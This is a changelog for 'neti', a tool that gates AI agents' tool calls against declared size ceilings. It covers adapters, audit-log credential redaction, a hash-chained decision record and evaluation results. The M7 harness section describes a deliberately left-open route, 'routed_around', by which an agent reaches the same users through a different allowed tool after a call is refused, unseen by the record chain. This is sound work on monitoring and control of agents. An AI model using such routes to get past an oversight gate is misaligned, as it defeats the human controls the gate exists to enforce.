Bring-your-own-key by construction rather than by policy. `assist_client.py` is the only module that
opens a socket, the hosted clients are constructed with no `base_url`, and a property test asserts
the file names no host but your provider, imports no HTTP client of its own, and that `import neti`
never loads it. `--provider local` points it at Ollama, LM Studio, llama.cpp or vLLM instead, in
which case nothing leaves the machine at all — no key, no account, and no extra to install, because
the local client is stdlib only.

Nothing a model says reaches a decision, and four things make that structural rather than stated.
The response schema has nowhere to put a magnitude, direction, unit or ceiling. The resolver enum is
derived from the rule table, so it cannot go stale and cannot name something the renderer could not
express. The output is commented-out YAML in a file `neti gate` never loads, with empty bands, so
even a merged suggestion resolves and records without being able to block. And the 41 parameters the
rule table already declined are excluded when the batch is built, so the command structurally cannot
ask a model to overturn a judgement somebody made in writing.

`SCOPE.md` said *"no model to drift"*. It says *"no model to drift in the decision path"* now, dated,
with the one real contamination path spelled out rather than hidden.

### M12, and the number that justifies the design

Measured against the committed answer key, on a model running locally:

    recovery    30 of 34 gates the rule table already makes · 0 wrong · 0 invented
    over-claim  28 of the 41 it had declined with a written reason

The second number is the interesting one. Arm A makes a model look trustworthy — shown parameters
nobody has judged, it claimed nothing wrong. Arm B shows the other half: shown parameters that
*look* claimable and were rejected in writing, it claimed 68% of them. `brave_web_search/query` came
back as `db.rows` — a web search string claimed as SQL, which is the failure this feature was
arranged around, verbatim. Eighteen more were `github.repos` on an `owner` sitting next to a `repo`.

`neti suggest` never sends those. That was decided on principle before there was a number; the
number says the 41 written judgements in the rule table are doing more work than the model is.

The first Arm A run recovered 17 of 34 and every miss was `fs.paths` — which was not a model failing
but the prompt asking the wrong question. It asked whether a parameter *"names a set"*, so the model
correctly reasoned that `Edit(file_path=...)` names one file; neti gates it because a resolver can
produce a *count*, and one file is a count of 1. Recovery went to 30 on a model four times smaller.

### One repository, one licence

BUSL-1.1 source sitting in a repository people are told is open source is honest and reads as a
caveat, at exactly the moment a reader is deciding whether to trust an open-source gate. The control
plane moved to its own repository; everything here is Apache-2.0 with no directory anyone has to
check.

What did not move is the client. `src/neti/cloud.py` and the tests pinning what a grant may
authorise stay, so the protocol remains readable and testable without the server — which is the
whole anti-lock-in argument, and it only holds while the client is on this side of the line.
`test_the_control_plane_never_decides` went with the source it reads: it sat here behind
`if not PAID.exists(): return`, which the moment the split happened would have made it pass forever
without reading a line of the code it checks.

### The paid tier was unreachable from the hook

`neti gate` had `--org`. `neti hook` did not — so a `CONFIRM` on Claude Code's built-in tools could
never reach a human, however carefully the operator had run `neti login`. That is the seam the
README calls *"the only seam that exists"* for a harness's own tools, and the one most installs use.

`run_hook` has always taken an `approver`, and `test_seam_equivalence.py` proves the hook honours a
granted approval — because the test passes one in directly. Nothing an operator could type did. The
capability was real, tested, and unreachable, which is the shape of defect this work keeps turning
up.

`--org` on the hook is **non-fatal** when there is no login, and that asymmetry is deliberate. For
`neti gate`, refusing loudly at startup is right: one long-lived process, and somebody who passed
`--org` believing their CONFIRMs reach a human should find out at once. For `neti hook` the same
exit code fails the tool call it was asked about, so every call in the session would fail. It says
the same thing and carries on without an approver, which leaves a CONFIRM stopping the call — the
free tier's behaviour, and the one the paid tier degrades to everywhere else.

Found by driving the control plane end to end for the first time, as separate processes rather than
in a `TestClient`: `neti-cloud serve`, `neti login`, a CONFIRM escalating with a real approval id
and the retry instruction, `neti-cloud list` showing a reviewer *500 recipients, above the declared
ceiling of 50*, `neti-cloud approve`, and the retry going through. Both negatives hold under real
processes too — **the grant is single-use** (the same call again raised a fresh approval rather than
reusing the spent one) and **a BLOCK is never escalated** (`approval: None`), so paying for a control
plane cannot buy a way past a declared ceiling.

### `pip install neti` left a `neti` command that could not start

`[project.scripts]` installs the `neti` entry point whatever extras you asked for, and `typer` lives
in the `cli` extra. So a base install had a command that answered with a `ModuleNotFoundError`
traceback — and one of its subcommands is `neti hook`.

That is the part that matters. **A `PreToolUse` hook exiting non-zero fails the tool call it was
asked about.** An operator who hand-wrote the hook config on a base install would not have got a
silently ungated session, which is bad; they would have got every tool call in the session failing,
which is worse. The rule the rest of `test_never_breaks_the_agent.py` holds is that the gate never
takes the session down with it, and an incomplete install is not an exception to it.

Now: a three-line message naming the extra to install and saying that `from neti import Preflight`
still works — and `hook` exits **0**, saying out loud that nothing was gated for that call, because
exiting 0 quietly would be the silent-pass failure this project spends most of its effort avoiding.

Found by building the wheel and installing it into an empty venv, which is the first time that has
been done here. The suite could not have caught it: every environment it runs in has the extra.

### The Entra family has a live tier now, waiting on a tenant

The four `entra.*` resolvers are the product's wedge and were the only ones with no live check at
all. Every assertion about them has been made against `neti.eval.synthetic` — a fixture we wrote,
which reproduces the provider failures we *thought of*, precisely the set a fixture cannot extend.

`tests/live/test_entra_live.py` is the check. Read-only, `GroupMember.Read.All`, skipping loudly
without a tenant. It asserts what only a real directory can settle:

- a real group resolves, and the direction says `EXACT` — the mislabelled bound is the mistake
  GitHub actually shipped, and only its live tier found it
- a group that is not there is `UNRESOLVED` and **never zero**
- **R2**, listed as unverified since the first release: that `$filter=userType eq 'Guest'` works on
  the cast `transitiveMembers` collection together with `$count`. If it does not, `entra.guests` and
  the `breakdown_bands: guest` rule in `examples/entra.yaml` are a policy that can never fire — and
  the test says *R2 is REFUTED* in those words
- **R6**, the claim every latency figure in the plan rests on: inside the 800ms budget, and flat in
  magnitude between a small group and a large one

The card gained a fourth state for it. `[ ready ]` — a live check exists and is waiting — is not the
same as `[ — ] never run against a real provider`, and the difference is between a gap nobody has
looked at and one somebody has done everything about except find a tenant.

### M11 said "verified" on the strength of a filename

`neti score` printed `[verified] db.rows — against Postgres 16, in Docker`. What backed that
sentence was `LIVE_VERIFIED`, a hand-written dict, pinned by a property test that checked
`tests/live/test_postgres_live.py` **exists**. A live test that had rotted, or that skipped every
assertion for want of a container, left the claim standing untouched. The same defect this project
keeps finding in itself — evidence that is really an assertion about a filename — sitting inside the
section that reports on evidence.

So the live tier writes down what it proved. `just live` leaves
`eval/results/live_verification.json` behind, in the shape `mcp_coverage.py` already established for
M10, and `neti score` reads it. A skipped module records as **skipped**, never as passed: running
the tier with no Docker must not be able to look like running it with Docker, and the previous
arrangement could not tell those apart at all.

The card has three states now instead of two:

```
[verified] db.rows            against Postgres 16, in Docker (8 checks passed)
[claimed ] fs.paths           against real filesystems … — no recorded run; `just live`
[  —     ] entra.principals   never run against a real provider
```

`fs.paths` is the interesting row. It has no `tests/live/` module by design — there is no provider
to be live against — so it was printing `[verified]` with nothing in this repository behind it. It
says what is true now.

And the tier was run, for the first time in this work: Postgres 16 and MinIO in Docker, real
`terraform` via the null provider, the live GitHub API. **28 checks, all passing**, which is the
evidence committed alongside.

### The console's routes had never been tested in CI

`src/neti/console` is a shipped artifact — `[tool.hatch.build] artifacts` puts it in the wheel — and
it is built rather than committed, so it is gitignored. CI did a plain checkout and never built it,
which meant `console_dir()` returned `None` and the four tests asserting every console route is
served skipped on every run. The surface a customer actually looks at, untested, invisibly, for the
life of the project.

`test_no_silent_skips.py` could not have caught it: its guard scans the source for `importorskip`,
and this is a `skipif` on a *built file*. It now requires the console under `NETI_REQUIRE_SDKS`, the
same way it already requires `npx` — and asserts the workflow builds one, so the fix cannot be
reverted quietly. CI gained the build step.

Found by cloning the branch into a clean directory and running the CI recipe against it, which is
the only thing that shows what a stranger's checkout actually does: 40 skips there against 29 here.

### M7 has a harness now, and its instrument is already verified

`neti score` has said *"M7 denial response — UNMEASURED"* since the first release. It is the last
claim in the project resting on plausibility rather than evidence: that naming a magnitude makes a
model **retry with a narrower target** instead of giving up, repeating itself, or reaching the same
objects through a tool nobody gated. No LLM has ever been in the loop in this repository.

`eval/harness/` is the thing that changes that — one command, `just m7`, needing a key and costing
tokens, with the tools resolving against the synthetic tenant so nothing real is touched.

Two decisions shape it.

**Classification is a rule over the calls the agent made, not a reading of its prose.** An LLM judge
scoring denial responses would put the softest available evidence underneath the hardest claim the
product makes. Every category — `narrowed`, `repeated`, `routed_around`, `abandoned`, `asked`,
`fabricated`, `unclear` — is decided from the tool sequence and the resolved magnitudes.

**`routed_around` is why it was worth building.** The interesting failure is not the model giving up;
it is the model reaching the same principals through `remove_user_from_group` after `delete_group`
was refused. Both calls are allowed, both under their ceilings, and **nothing in the record chain
would say the gate had been evaded** — SCOPE.md NC-03 already admits neti sees a proposed call and
not a plan. One scenario deliberately leaves that door open, because a harness whose only options are
comply or stop would report a flattering number by construction.

The measurement waits for a key. The *instrument* does not: the classifier is pinned by
`tests/e2e/test_m7_classifier.py`, and so is the driver itself with only the model call faked — real
policy, real `Engine`, real `gate_tools`, real denial sentence. One of those tests asserts the model
is handed the product's actual wording, magnitude and all, because a harness that fed it a paraphrase
would be measuring the harness. So a wrong number can only come from the model's behaviour, which is
the thing being measured.

### Ten credential formats went to disk in plaintext

`core/redact.py` opens by calling this "the worst shape of defect available to" a security tool: an
agent passes a token as a tool argument, and it lands in the file the product asks you to keep,
verify and hand to an auditor. It has two independent rules — redact by parameter *name*, and redact
by value *shape* — and says why either alone is too weak: "agents pass credentials under names
nobody predicted".

Probed with the credentials people actually hold, the value rules missed **Stripe** (`sk_live_`,
`rk_live_`, `sk_test_`), **Google API keys** (`AIza…`), **Google OAuth refresh tokens**, **PyPI**,
**npm**, **GitLab** PATs, **Slack** app-level tokens, and a whole `Bearer …` header handed over as a
string. Each was caught only when the parameter happened to be named something like `api_key` —
precisely the assumption the value rules exist to remove. Stripe is a server in
`eval/surveys/catalogue.py`, so an agent holding one of these is not hypothetical.

All ten are matched now, anchored and length-bounded, and there is a second list in the tests of
values that must **not** be redacted — `s3://backups/prod/`, `src/**/*.py`, `DELETE FROM users …`,
`Bearer of bad news`. Over-redaction is cheap but not free: the gated target is an ordinary field,
and it is the evidence the record exists for.

### Which runtime is yours, and which are not reached

"Twelve adapters" answers a question nobody asks. What somebody asks is *does this work with
Cursor*, and the answer is that neti never hears of Cursor at all: it speaks MCP, the gate goes in
front of the MCP server, and whatever launched that server launches `neti gate` instead.

`neti score` now lists 23 runtimes against the door each arrives through — and keeps two very
different claims apart. An adapter row was **driven** by the seam table. An MCP client was not run
at all: what is tested is that neti gates a real MCP server over a real pipe, and that Cursor speaks
MCP is a fact about Cursor rather than something this suite establishes. Printing both as though
each had been measured here is the overclaim the card exists to avoid, and a property test keeps the
two groups separable.

And the complement, because a coverage table without one is a marketing table. Not reached: an agent
whose tools are in-process functions in a language this package cannot wrap and which does not go
through MCP — a Vercel AI SDK or Mastra app with locally-defined TypeScript tools is the common
case — and hosted runtimes that execute tools server-side, where there is no local seam to sit at.

### The shape most agents actually are

Twelve seams now. The new one is not a framework at all: an Anthropic Messages loop or an OpenAI
Chat Completions loop, where the model returns a tool call and your own code looks the function up
by name and calls it. That is what "claude" and "openai" mean to most people, and the only thing
covering it was `Preflight.dispatch` and `@pf.guard` — both correct, and both with the weakness
`preflight.py` has always stated out loud: forget one tool and it has no gate, and nothing detects
the omission.

`gate_tools(pf, TOOLS)` wraps the whole dispatch table in one substitution, so the loop underneath is
unchanged and cannot be *partially* gated. A tool added to the original dict afterwards is still
ungated — that has not gone away — but the common failure, gating four of five and believing you
gated five, has.

### The gate got six times slower the longer you left it on

`neti hook` is one process per tool call, and it read the **entire record file twice** on every one —
once to seed the chain, once again under the append lock. Measured on a lean install:

| records | before | after |
|---|---|---|
| fresh | 133ms | 139ms |
| 10,000 | 273ms | 139ms |
| 50,000 | 816ms | 136ms |

The README published a flat *p50 172ms*, and this page's own advice is to run a week in observe
mode — which is how you get to fifty thousand records. A gate that becomes six times slower the
longer it is installed is a gate people uninstall, and nothing in the suite could see it because
every test writes a handful of records to a fresh temp file.

The head now lives in a `.head` sidecar keyed on the record file's byte length. Anything that
appended, truncated or rewrote the file outside the sink stops the key matching and every reader
falls back to the full walk, so a stale, corrupt or absent sidecar costs a walk and never a wrong
answer — three tests in `test_regressions.py` hold that line, including one that makes the walk
raise to prove the sidecar is genuinely being used.

The cost table now publishes the flat figure and says what used to happen.

### `pip install neti` could not `import neti`

The package's base dependencies are pydantic and pyyaml. `resolvers/graph_client.py` imported
`httpx` — which lives in the `graph` and `mcp` extras — at module scope, and that file is reached by
`engine` -> `registry`, so a plain install raised `ModuleNotFoundError: httpx` on the first line of
the README's own in-process example. The entire public surface, unusable, on the install instruction
most people would try first.

Nothing could have caught it for exactly the reason nothing caught `import fcntl` two releases ago:
every environment the suite runs in installs the extras.

The httpx client is now built on first *use* rather than at construction, so a policy that never
reaches Graph never imports it — and `resolvers_for_client` can keep building a `GraphClient`
unconditionally, which is what makes a mistyped entra resolver fail on its first call instead of at
startup. `test_platform_imports.py` gains the general rule: every module a fresh `import neti`
loads must be importable with the base dependencies alone, plus the other half — the README's
filesystem example reaching a real verdict with no extras at all.

Measured in a clean venv: `pip install neti`, `from neti import Preflight`, a real gated call.

### The published record size was ~50% optimistic

`README.md` said **~700 bytes per call**, under a heading that says *measured, not modelled*. A
coding agent's calls against `examples/coding-agent.yaml` write a median of **1,057 bytes** with
short relative paths and **1,230** with a realistic absolute one. Nothing recent caused it — the
`synthetic` field added this release is five bytes of it — the number had simply not been
re-measured, and it was wrong in the direction that flatters us.

Most of a record is `causes`, the per-argument evidence that makes a verdict re-derivable, plus
whatever `args` the call carried; it moves with how long the operator's paths are. So the table now
publishes a range, and `test_docs_are_true.py` measures records and compares them against the range
it reads out of the README. A project that asks people to check its numbers has to survive its own
numbers being checked.

### The console showed invented magnitudes as measured ones

The third and last layer of the `--demo` defect. The record carries `synthetic`, the API returns it,
and the console rendered neither — so a demo row sat beside a measured one with the same confident
figure and nothing to tell them apart, in the surface built specifically for showing people numbers.
The decisions list now marks the row and the detail page names the source in its provenance block
and says why the marker cannot be stripped.

### `neti prove` — every door, one call, and a chain you can re-check

Eleven adapters is a number in a README. This runs the same call through every seam the machine it
is on can actually reach, prints the verdict, the magnitude and the sentence each one produced, and
verifies the hash chain they wrote into.

Two rules make it worth reading rather than worth skipping.

**Driven and cited are never mixed.** The SDK adapters need SDKs the wheel deliberately does not
ship, so on a bare install some doors cannot be opened. Those seams still appear — silence would
let a reader infer coverage that is not there — but as *not driven here*, naming the import that is
missing and the test that does drive them. A row that looks measured for a door nobody opened is the
one output this command must not be able to produce, and
`test_a_missing_sdk_is_never_rendered_as_a_measurement` is the guard.

**The proof is the chain, not the table.** Any program can print eleven identical lines. Every
decision goes into one real file, and the command prints the `neti verify` invocation that re-checks
it — including `--mode enforce`, because observe and enforce are different policies with different
digests and the obvious form of that command reports every record as "decided under a different
policy". An instruction that does not work is worse than none. `neti verify` grew `--mode` for it,
which an operator whose policy has since moved to enforce needed anyway.

Four doors open with no extras installed, so the demo has a floor on a machine with nothing
configured — which matters, because `neti demo --here` with no traffic yet stops after two of six
acts, and this is the half that needs nothing.

### Every section of the scorecard names its evidence

`eval/README.md` already says *a trial that does not end as a number on `neti score` does not count*.
This is the converse, made mechanical: a number on `neti score` that nothing produced does not count
either. Each section prints the artefact behind it, every cited path must exist, and a section with
no `EVIDENCE` entry fails the build.

It caught one immediately. `NOT YET MEASURED` had no evidence — which is exactly what that section
*is*, so it now says so out loud rather than being the one heading that quietly sits outside the
rule.

### A `--demo` record was indistinguishable from a measured one

`--demo` resolves against the built-in tenant so somebody can watch the whole path work with no
credentials. It produces numbers that are exact, confident and entirely invented — *41,203
principals, `direction: exact`* — sealed into the same hash chain by the same code, and nothing in
the record said so. The default records path is the one a real run writes to.

So a demo interleaves fabricated traffic with measured traffic in one file. `neti report` averages
the two. `neti propose` reads that summary and would have suggested a production ceiling fitted
partly to a fixture. An auditor reading the chain had no way to tell which rows were which.

`DecisionRecord` gains `synthetic`, and the record schema goes to **`neti.decision.v2`** — a version
rather than an additive field, because `chained` is what `verify_chain` recomputes and adding a key
to it unconditionally would make every record written before today report as tampered with. A v1
record recomputes exactly the fields it was sealed over and still verifies; a v2 record covers the
marker, so it cannot be stripped by anyone holding the file. `tests/property/test_record_schema.py`
pins both halves.

Downstream: `neti report` says how many decisions in the window are synthetic, above the numbers
rather than under them. `neti propose` **refuses** such a window — everything it prints is a figure
an operator is about to paste into a policy and defend at 2am — unless `--allow-synthetic` says they
know which it is, which is what the no-credential walkthrough passes.

### A log file that could not be opened switched enforcement off

The worst defect this project has had, and the sibling test that should have caught it had the right
sentence in its docstring the whole time.

`neti hook` reads the record chain's head before it decides, so a records path that is not writable —
a full disk, a permissions change, a path pointing at a directory — raised out of that read and hit
the catch-all handler. That handler exits 0 with nothing on stdout, and **no stdout is how the
`PreToolUse` protocol spells "no opinion"**. Every gated call in the session proceeded. The reason
went to stderr, which in a hook nobody reads.

`test_an_unwritable_records_path_still_lets_the_session_run` said *"Recording is evidence, not the
decision. Losing the ability to write must not become an inability to answer"* — and only ever
checked that the process survived, so it never noticed the answer had gone with the file. For a
product whose claim is "blocks calls whose resolved magnitude exceeds a ceiling you declared", that
is the claim silently retracting itself.

Now: the chain-head read degrades to a fresh chain, `Gatekeeper.decide` catches a failing sink and
carries `record_error` instead of raising, the call is still gated, and the operator is told on
stderr that the audit chain has a gap. `neti verify` reports the break. Pinned at the shared layer —
one test on `Gatekeeper`, which is where all eleven doors write — and end to end through the hook.

**SCOPE.md gains NC-13** for it, because a chain that can have gaps is a thing a customer is entitled
to know before they rely on the record rather than after.

### `ProposedCall.call_id` is gone

Set by the MCP gateway, read by nothing — the same dead-field shape as `providers:` and
`ServerSpec.env`, both of which shipped looking configured and doing nothing. Correlating a decision
to the agent's own tool call is worth having and is not free: the record's digest covers an explicit
field list, so a field outside it is annotation a tamperer can rewrite, and a field inside it changes
what `verify_chain` recomputes — every record written before the change would fail verification.
That is a `neti.decision.v2` with a migration, decided on its own merits. Removed rather than kept
warm.

### Coverage, on both axes, and the four defects that were hiding behind it

Two claims this product rests on were being made by tests that could not check them. The seam table
proved eleven runtimes agree — about Entra, because every case in it used `examples/entra.yaml`. And
`neti init` gated **0 of 160** tools across the MCP servers people actually install, which no fixture
could see because every fixture was a tool somebody here wrote to be gateable.

Fixing the tests found four defects. Every one of them was a thing that had never been pointed at
something it did not already agree with.

- **`Preflight.from_config` demanded Entra credentials for every policy.** The shipped
  `examples/coding-agent.yaml` — every gate `fs.paths`, no credential needed anywhere in it — raised
  `missing credentials: NETI_TENANT_ID…` on the one seam the README hands you for a tool loop you
  wrote yourself. The CLI had already been fixed for exactly this; the predicate was private to
  whichever door noticed first, so it moves onto `Policy`.
- **A pending approval read three different ways across eleven seams.** The hook and the MCP gateway
  each carried their own copy of the sentence and had drifted — the gateway told the model to *retry
  this exact call once it is granted*, which is the entire reason for naming an approval id, and the
  hook did not. `Preflight` had no copy at all, so on the SDK seams a pending approval arrived as a
  flat "needs confirmation": no id, no sign a human had been asked, nothing to retry against. A
  paying customer on LangChain got strictly less than one on MCP. The table had granted and denied
  rows and no pending row.
- **Session budgets could never accumulate on the OpenAI Agents seam.** The adapter passed the SDK's
  `tool_call_id` as `session_id`, and that identifies one invocation, so every call opened its own
  tally and the session total was permanently 1. SCOPE.md NC-01 says only a declared budget sees four
  thousand small calls; on that runtime the budget was inert. Invisible until the test driver stopped
  pinning `tool_call_id` to a constant — a fixture tidier than reality hides the bug reality has.
- **`explain_denial` phrased a CONFIRM-on-unresolved as itself**: "Preflight confirm: /to could not
  be sized". Not cosmetic — four seams hand the model a sentence and no structured payload, so on
  those runtimes the sentence *is* the verdict, and a CONFIRM opening with "confirm" was
  indistinguishable from a block.

### Measured

- **M8 is now a section rather than an outstanding item.** Eleven seams — the hook, both MCP
  transports, the in-process gate, and adapters for Anthropic, OpenAI Agents, LangChain/LangGraph,
  CrewAI, Pydantic AI, AutoGen and Google ADK — driven across five resolver families by one table,
  asserting the same verdict, the same magnitude and the same denial sentence byte for byte. It was
  63 rows; it is 301.
- **M10 moves off zero: 23 of 160 gated, then 25 after the corpus found another rule.** The more
  interesting half is what the matcher now refuses. The hand-written map in `eval/surveys/` claimed
  43 of those tools were sizeable and was wrong about roughly two thirds, always the same way — it
  matched a parameter *name* and asked nothing else. 21 hits on an `owner` belonging to a call that
  touches one issue; 21 on a `repo` that `github.files` structurally cannot take, since a JSON
  pointer resolves one value and `/repo` arrives as `api` and is read as an owner; 7 on a `query`
  that is a web search. Those are declines now, each with its reason written into the generated
  policy, because an operator cannot overrule a judgement they cannot see. Every registered resolver
  is either proposable or has a stated reason it is not, so `never_proposed` is empty.

### Added

- `tests/e2e/worlds.py` — a policy and its resolvers per kind of thing an agent touches. `db.rows`
  reaches a real sqlite file through the shipped `EnvCountRunner`, so the `sqlite:///` parsing and
  the read-only open run for real rather than being bypassed by an injected runner.
- `tests/corpus/` — 170 real tool schemas and the judgement on each, derived from the field survey
  and from Claude Code's own built-ins, which no `tools/list` anywhere reports. `NotebookEdit` fell
  out of it immediately: `notebook_path` is a plain local file on the runtime this gates most often,
  and the rule was an enumeration of the spellings that happened to get written down.
- `just conformance` and `just corpus-refresh`.
- The `sdks-extended` extra. The four new SDKs install cleanly alongside the existing three —
  measured with a real resolve — but their closure is ~200 packages including chromadb and numpy,
  almost all of it via CrewAI, so `just install` does not hand somebody gating a coding agent a
  vector database. CI installs both.

### Known, and deliberately not fixed here

- `ProposedCall.call_id` is set only by the MCP gateway and read by nothing — neither `Engine` nor
  `DecisionRecord`. The same dead-field shape as `providers:` and `ServerSpec.env`. Plumbing it into
  the record changes the record schema and therefore the chain digest, which touches `verify`,
  `replay` and the golden transcripts; it is not being bundled into a coverage change.
- Claude Code's built-in schemas in `tests/corpus/builtins.py` are authored from documentation
  rather than captured from a live session. It is the one part of the corpus with no live source,
  and a parameter renamed upstream would not fail anything until somebody noticed.

### Field trials: what happens when the tests stop writing their own fixtures

Everything in `tests/` drives an agent somebody here wrote. `test_real_mcp_server.py` uses a real
server over a real pipe, but the client is a list of JSON-RPC strings, and the seam-equivalence
table drives the three SDK adapters with synthetic inputs. `eval/` is the tier above that: real
servers, real providers, run by hand rather than by CI. See [eval/README.md](eval/README.md).

The first pass measured coverage and stood up three live provider tiers. It found four defects, all
of them the same shape — a thing that had never been pointed at anything real.

- **`neti init` could not introspect any server that needs a credential.** `find_clients` parsed the
  `env` block out of the client config into `ServerSpec.env`, and nothing ever read it, so every
  credentialed server — Slack, GitHub, Notion, Stripe, Drive — exited at startup naming the variable
  it wanted and was reported as un-introspectable. That is most of the SaaS surface, and the
  operator's own config had the token in it the whole time. The same dead-field failure as
  `providers:`, one directory over. `StdioUpstream` now takes an `env` merged over the inherited one
  — merged, never substituted, or every server that declares any `env` loses `PATH`.
- **`db.rows` never closed its connection.** Deliberate to hold one open — the gate is a long-lived
  process — but nothing closed it, and psycopg's own `__del__` warns about that. Under
  `filterwarnings = error` the warning surfaced on whichever unrelated test happened to trigger the
  collection. Invisible to thirty-nine offline tests because sqlite does not warn.
- **`boto3` and `psycopg` were not installed in a working checkout**, despite both extras being in
  `just install` *and* in the CI line, with a test asserting CI installs them. Nothing asserted they
  *import*, and no offline test needs them: the storage tests drive a mock lister and the database
  tests drive stdlib sqlite. Both are now in `test_no_silent_skips.py`.
- **`uv run mypy` passed or failed depending on which extras were in the venv**, because the two
  deferred provider imports carried inline `type: ignore[import-not-found]` comments that mypy calls
  unused once the package is present. Moved to a `[[tool.mypy.overrides]]` block.

### Measured

- **M10, coverage in the wild.** Against a config carrying the MCP servers people actually install,
  `neti init` gates **0 of 160 discovered tools** across the 13 servers that launch. Forty-three
  carry a parameter a *shipped* resolver could size, so the gap is a matcher defect rather than a
  missing resolver: `insight/discover.match` only knows `entra.principals` and `entra.apps`, and can
  therefore only ever propose 2 of the 10 resolvers that exist. It is the least comfortable number
  in the project and it is now on `neti score`.
- **M11, live provider verification.** `db.rows`, `storage.objects` and `terraform.destroy` all
  shipped without ever touching a real provider. All three now have a live tier that needs no cloud
  account — Postgres and MinIO in Docker, and Terraform's `null` provider — behind `just live-up`.
  The Entra family stays unverified and stays printed as unverified.
- **M7 (what a real model does after a denial) and M8 (harness compatibility) are now listed as
  outstanding** rather than being absent from the card. No LLM has been in the loop in this
  repository, and the claim that a denial makes an agent narrow its scope has never been observed.

### Added

- `examples/data-agent.yaml` and `examples/infra-agent.yaml`. `db.rows`, `storage.objects` and
  `terraform.destroy` all shipped with no example; `test_shipped_examples.py` globs the directory,
  so both are load-and-construct tested.
- `just live-up` / `just live` / `just live-down`, and `just field`.

Coverage of what agents actually run: four more resolvers and a fourth runtime. 0.1.0 could size an
Entra group and a Terraform plan, which meant that pointing it at a coding agent produced a page of
`allow` — the seams worked and there was nothing behind them.

### Resolvers

- **`fs.paths`** — files under a path, directory or glob. Exact, local, strongly consistent; capped,
  and a capped answer is a `LOWER_BOUND` rather than a small number. This is the one that makes
  gating a coding agent mean anything.
- **`db.rows`** — rows a `DELETE` or `UPDATE` would take, counted with `select count(*)` rather than
  `EXPLAIN`, so the low bias of planner estimates never applies. Always a `LOWER_BOUND`, because
  `ON DELETE CASCADE` fan-out is invisible to it. It recognises two statement shapes and declines
  everything else: a mis-parse yields a count of the wrong predicate and a confident wrong verdict,
  which is worse than no answer. `SCOPE.md` NC-10 is rewritten to say exactly what is now covered.
- **`storage.objects`** — objects and bytes under an `s3://bucket/prefix`. The only resolver here
  that is not O(1), because object stores have no prefix-granularity count; capped hard, and past
  the cap a `LOWER_BOUND`.
- **`github.repos` / `github.files`** — every repository in an org (one request), and every file on
  a repository's default branch (one recursive tree request, with GitHub's own `truncated` flag
  becoming the direction). New `repositories` unit, because "block above 50" is a sentence somebody
  can defend about files and a very different one about repositories.

Each declines rather than guessing, and none can return `0` for something it could not reach.

### Runtimes

- **LangChain and LangGraph**, via a delegating `BaseTool` — `bind_tools`, `create_react_agent` and
  `ToolNode` all accept it, and `convert_to_openai_tool` produces a byte-identical schema, so an
  agent cannot tell a gated tool from an ungated one.
- Alongside the Anthropic `tool_runner` and OpenAI Agents SDK adapters. All three return a denial as
  a tool *result*, never an exception: a run that has died cannot narrow its scope and try again.

### Fixed

- **A policy that gated no Entra tool still demanded `NETI_TENANT_ID`.** Every command built the
  full directory registry before reading the policy, so gating file writes required an Azure app
  registration. Credentials are now required only by the resolvers a policy actually binds — and a
  policy that *does* bind one still fails loudly at startup rather than on the hot path.
- **A blocked call killed a LangGraph run.** `ToolNode` requires a `ToolMessage`; the denial was a
  bare string, so it raised `TypeError` inside the node. Every direct-`invoke` test passed against
  that. A gate that crashes the agent is worse than the call it stopped.
- **`sqlite:////absolute/path` was read as a relative path**, and because `sqlite3.connect` creates
  a missing file, the symptom was an empty database in the working directory rather than an error.
  Now read-only, and absent files say so.

### `neti propose` reports the interrupts its ceilings cannot remove

The IMPACT line used to be computed by comparing bare magnitudes, which made it wrong for every
resolver that reports a bound. `decide` escalates any resolution that cannot soundly clear a
ceiling, so with `db.rows`, `storage.objects`, a capped `fs.paths` or `github.files`, a call
*under* the ceiling is still an interrupt. On real traffic the old output read "nothing in the
observed window would have been stopped" when in fact all forty calls escalate.

There is now a second line reporting those separately, because no choice of ceiling changes them:

```
  IMPACT    over the observed window this would have blocked 4 call(s) and asked about 0
  ALSO      36 call(s) under these ceilings resolved to a bound rather than a count
            (cascades, caps, members you cannot see). These take your declared
            on_unbounded / on_unresolved verdict whatever ceiling you pick.
```

### Credentials no longer reach the audit log

The worst-shaped defect a security tool can have, and it was there from the first release: every
gated call recorded its arguments verbatim, so a tool called with `{"api_key": "sk-live-…"}` wrote
that key in plaintext into the file this product asks people to keep, verify and hand to an auditor.
The file was also mode 0644 — on a shared host, an audit log of every agent's every tool call,
readable by anyone.

Both fixed. `core/redact.py` replaces credential-shaped values, tested against real formats (GitHub,
OpenAI, Anthropic, Slack, AWS, JWTs, PEM keys, connection strings with inline passwords) by both key
name and value shape, since either test alone is too weak. Records are `0600`.

**The gated target is never redacted** — that is the rule everything else bends around. It is the
evidence the verdict was measured from, `causes` carries it regardless, and redacting it would
protect nothing while making the record useless. What was redacted is *named* in the record and is
inside the hash digest, so a hidden field cannot be made to look like an absent one.

### `neti install` — one command instead of hand-edited JSON

Wiring the gate meant editing `.claude/settings.json` to a shape you had to copy correctly, in a
file an agent depends on, with no feedback until the next session behaved oddly. Now it merges into
whatever is already there, leaves other hooks and every other key untouched, is idempotent, prints
the change before making it, and keeps a backup.

It refuses in two places rather than guessing: settings that cannot be parsed are never overwritten,
and a policy is *constructed* rather than merely parsed before being wired in.

### `neti demo --here` — a finding about your machine, not a fixture

The existing demo is careful to say what it is: *"It demonstrates behaviour, not a finding."* True,
and also why it cannot answer the only question an evaluator asks — what this would find in *their*
environment.

`--here` runs the same six acts against the directory it is standing in, through the same engine,
decision procedure, records and reports as production. Acts 1 and 2 need nothing at all and produce
the day-one number: *an agent working here reaches N objects*. With traffic it runs the rest —
report, propose, enforce the proposed ceilings against the same calls, verify and replay.

Two supporting pieces:

- **`providers:` is finally read.** It had been in the policy schema since the first release and no
  code path ever looked at it, so `fs.paths` had no root, `github.repos` no owner, and
  `neti inventory` could only produce a number for Entra. A fourth construction guard now refuses
  any provider key nobody reads, beside the three that already catch dead config.
- **`examples/coding-agent.yaml`** — the policy for the agent most people actually run. `Bash` is
  ungated in it deliberately, with the reasoning next to the gap.

`neti.eval.corpus` captures a decision log into re-runnable traffic: the hook already records every
call, so an afternoon in observe mode *is* the capture. Paths are kept relative to the repository
root and anything outside is dropped rather than scrubbed, because a corpus is a thing people share.

Two things it will not do: attribute a resolver's reach to a single tool (`Edit` takes one
`file_path` and touches one file), and print a capped walk as a total — a 712,359-file tree reports
`≥ 200,000`, not `200,000`.

### `neti verify --config` replays the log against the decision procedure

The command has always said *"Replay every decision and verify the hash chain"* and only ever did
the second half. They answer different questions, and the second is the one the architecture is
arranged around — resolvers do the I/O, `decide` is pure, and a record keeps the resolutions
precisely so the decision can be re-run:

- **the chain** answers "has this record been altered?"
